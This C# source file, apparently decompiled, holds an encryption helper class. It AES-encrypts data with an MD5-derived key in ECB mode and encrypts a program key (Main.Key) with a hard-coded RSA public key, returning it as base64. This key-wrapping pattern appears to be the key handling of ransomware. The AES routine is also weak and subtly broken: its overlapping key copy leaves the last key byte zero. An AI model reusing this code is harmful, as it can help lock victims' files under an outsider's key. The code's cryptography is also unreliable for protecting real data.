using System;
using System.Security.Cryptography;
using System.Text;

namespace SF;

internal static class Encryption
{
	public enum KeySizes
	{
		Size2048 = 0x800
	}

	public static byte[] AesEncrypt(byte[] input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] array = new byte[32];
		byte[] sourceArray = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(pass));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
		return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
	}

	public static string Run()
	{
		byte[] inArray = Encrypt("<RSAKeyValue><Modulus>3boagiNLlWEsCQIU11Q1Zo6gEQYu4XDT4ii0MXYYG8ogu35vNvq5fQHK2XFM5yFNn5RtpPqdYdPp8DdSIvj99rWlIYcAvVgne+FWAY34MvU1ReailzhLf8p6l3rXOEcO/rzEAZLmJi0hAYBEs18jBIIxLgixXlYCdwIlykLDLnlkcWV1ijN8us5KFFGlhbFv3zzb3Gehc369Bi/m5jAzNBXQeQnJ9tQj30ZYSCHHPbOY5sN4/wVnBG+8n0vFPMzQw9iNcDbDUi1QgMmqd3qXAfh5begAMdjeX1jcRngTIn8D40qTPDtUcAAzQCPSnx/4u2jo3hvC0kVBodZb7UkTHQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>", Encoding.UTF8.GetBytes(Main.Key));
		return Convert.ToBase64String(inArray);
	}

	private static byte[] Encrypt(string publicKey, byte[] plain)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		rSACryptoServiceProvider.PersistKeyInCsp = false;
		rSACryptoServiceProvider.FromXmlString(publicKey);
		return rSACryptoServiceProvider.Encrypt(plain, fOAEP: true);
	}
}
